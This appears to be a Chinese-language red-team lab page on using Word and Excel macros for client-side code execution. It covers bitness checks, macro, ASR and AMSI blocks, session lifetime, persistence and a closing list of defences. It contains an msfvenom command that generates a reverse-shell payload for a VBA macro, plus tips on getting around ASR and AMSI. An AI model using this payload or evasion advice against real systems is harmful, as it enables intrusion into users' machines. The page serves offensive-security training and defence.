# Office 宏

Word / Excel 宏仍然是客户端执行的常见入口。公开实验里把它当成「带 GUI 的脚本宿主」，而不是「一发入魂的马」。

## 先判断什么

1. **宏有没有真的跑起来**  
   用无害回调（访问你实验机上的一个空路径、或只写 `%TEMP%` 里一个文件）。没有回调，就不要上任何执行逻辑。
2. **Office 进程位数**  
   64 位 Windows 上的 Office 仍可能是 32 位。VBA 的 `PtrSafe` / `LongPtr` 声明必须和 `WINWORD.EXE` 一致，否则直接崩溃。
3. **失败发生在哪一层**  
   - 宏被禁用 / 受保护视图 → 用户交互或策略问题  
   - 宏能跑，但一启动 `powershell.exe` 就失败 → 子进程 / ASR  
   - PowerShell 起来了，脚本内容被拦 → 脚本扫描，见 [AppLocker 与 AMSI](/topics/applocker-amsi)  
   - 回连成功，关掉文档会话消失 → 宿主生命周期

## 三条常见路线（概念）

| 路线 | 含义 | 典型限制 |
|---|---|---|
| 宏拉起 PowerShell | 短、好写 | 子进程链显眼；ASR「阻止 Office 创建子进程」会直接杀 |
| 只在 WINWORD 进程内做事 | 不出现 `powershell.exe` | 实现复杂；位数、内存权限、崩溃都要自己处理 |
| 宏只做第一阶段 | 下载或触发下一阶段 | 出网、AMSI、第二阶段路径必须已验证 |

实验室里先走「无害回调 → 位数探测 → 再决定形态」。位数未知时投完整 runner 等于赌博。

## 公开工具语法

```bash
# 生成 VBA 格式的缓冲区（自己粘进宏；本站不提供现成宏文件）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f vbapplication
```

`EXITFUNC=thread` 通常比退出整个 Word 进程更适合实验。监听与投递见 [实验环境](/lab/environment)。

PowerShell 侧若必须走子进程，先确认语言模式：

```powershell
$ExecutionContext.SessionState.LanguageMode
```

`ConstrainedLanguage` 下 `Add-Type`、反射、很多动态能力会不可用，不要在这条路上死磕，换宿主或换模块。

## `Add-Type` 临时文件

PowerShell 的 `Add-Type` 常把编译结果写到用户临时目录。有的环境允许脚本运行，但会抽走这些临时 DLL。现象是「PowerShell 起来了，编译型 runner 失败」。这时要改的是**加载方式**（预编译程序集、反射加载），不是再加一层编码。

## 生命周期

文档关闭后，VBA 线程和未迁移的会话会一起没。实验里一旦拿到会话，先看同用户下有没有更长寿的进程；迁移、计划任务、服务，都属于「离开 Word 生命周期」的问题，而不是入口问题。

## 失败分类

| 现象 | 先查 |
|---|---|
| 完全没有回调 | 宏安全、受保护视图、文件是否真被打开、投递 URL |
| 回调有，PowerShell 没有 | ASR / 子进程策略；改进程内路线或换 HTA / WSH |
| 有 PowerShell，脚本被声明恶意 | AMSI / 内容扫描；换宿主，不要只改变量名 |
| Word 一关就断 | 迁移 / 常驻，不是重新做宏 |

## 防御侧

- 禁用除受信任位置以外的宏；启用受保护视图
- ASR：阻止 Office 创建子进程、阻止 Office 注入进程
- 邮件网关拦 `.docm`；把宏执行限制在签名文档
- 监控 `WINWORD.EXE` → `powershell.exe` / `cmd.exe` / `cscript.exe` 进程链
